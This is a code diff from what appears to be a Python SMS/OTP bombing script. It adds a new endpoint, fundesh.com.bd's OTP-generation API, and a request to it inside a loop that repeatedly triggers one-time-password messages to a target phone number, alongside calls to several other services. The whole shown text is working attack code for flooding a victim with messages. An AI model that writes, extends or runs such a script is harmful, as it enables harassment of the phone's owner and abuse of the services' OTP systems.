@@ -65,6 +65,14 @@ headers6["Content-Type"] = "application/json"
 data6 = '{\"mobile\":\"'+number+'\"}'
 
 
+#7 
+fnds = "https://fundesh.com.bd/api/auth/generateOTP?service_key="
+
+headers7 = CaseInsensitiveDict()
+headers7["Content-Type"] = "application/json"
+
+data7 = '{\"msisdn\":\"'+number+'\"}'
+
 
 
 
@@ -78,6 +86,7 @@ for j in range(amount):
     resp2 = requests.post(quiz, headers=headers3, data=data3)
     resp5 = requests.post(tms, headers=headers5, data=data5)
     resp6= requests.post(shoj, headers=headers6, data=data6)
+    resp = requests.post(fnds, headers=headers7, data=data7)
 
 
     print("")
